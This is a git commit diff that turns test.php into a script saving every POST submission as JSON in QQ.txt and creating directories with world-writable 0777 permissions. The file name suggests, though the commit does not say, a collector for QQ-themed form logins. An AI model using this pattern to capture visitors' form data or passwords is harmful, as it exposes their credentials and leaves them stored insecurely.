ffb62f6ae2a80f0a73abf229da9682fa0236b21f
J.Hu1 <102945328+JiliHili@users.noreply.github.com>
2022-04-23 06:24:13 +0700

    Add files via upload

--- test.php
+++ test.php
@@ -1,3 +1,27 @@
 <?php
-    echo Hello World
+ 
+function write($file_name,$data,$mode='w'){
+                     
+    if(!in_array($mode,array('w','a','x')))
+        return false;
+ 
+    $dir = dirname($file_name);
+ 
+    if(!is_dir($dir))
+        $dir = mkdir($dir,0777);
+         
+    if(!$dir) return false;
+ 
+    $file = fopen($file_name,$mode);
+     
+    if(!$file || !is_writable($file_name)) return false;
+                 
+    fwrite($file,$data);
+    fclose($file);
+     
+    return true;
+ 
+}
+ 
+echo write('QQ.txt',json_encode($_POST));
 ?>
